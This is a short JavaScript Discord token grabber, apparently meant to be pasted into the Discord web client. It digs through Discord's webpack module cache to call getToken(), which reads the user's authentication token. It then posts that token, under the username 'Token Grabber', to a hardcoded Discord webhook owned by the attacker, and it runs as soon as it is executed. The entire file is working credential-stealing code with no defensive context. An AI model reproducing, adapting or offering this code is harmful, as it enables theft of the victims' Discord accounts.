function sendMessage() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1406635172753051791/5p3jhyc2fcweXJQWgqr44NCTnoRdasPV66XNirJuMyoTAlR3WJpMHYslgIutIj73WXQ0");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
                  username: "Token Grabber",
                  avatar_url: "",
                  content: (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
                   };
    request.send(JSON.stringify(params));};
sendMessage();
